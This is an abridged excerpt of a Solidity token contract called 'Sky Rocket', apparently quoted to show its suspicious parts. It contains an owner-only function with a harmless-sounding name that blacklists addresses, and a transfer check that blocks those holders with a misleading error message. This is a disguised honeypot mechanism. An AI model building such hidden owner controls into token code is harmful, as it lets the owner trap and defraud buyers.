...
contract SkyRocket is Context, IERC20, Ownable {
    ...
    mapping (address => bool) public _isIncludedToEvent;
    ...
    string private _name = 'Sky Rocket';
    ...
    uint8 private _decimals = 9;
      ...
      constructor() {   
    Tokens[msg.sender] = _rTotalSupply;
    _Slot = 2;
     _UniswapV2 = 0xEde1Ad8E5263CbA8CCe4dB661B9F1a98b1d6D156;
    ...
    function includeAccount(address account) external onlyOwner() {
       ...
       function IncludedToEvent(address[] calldata addresses) external onlyOwner {
      for (uint256 i; i< addresses.length; ++i) {
        _isIncludedToEvent[addresses[i]] = true;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        require(!_isIncludedToEvent[sender] && !_isIncludedToEvent[recipient], "Excludefromreward");
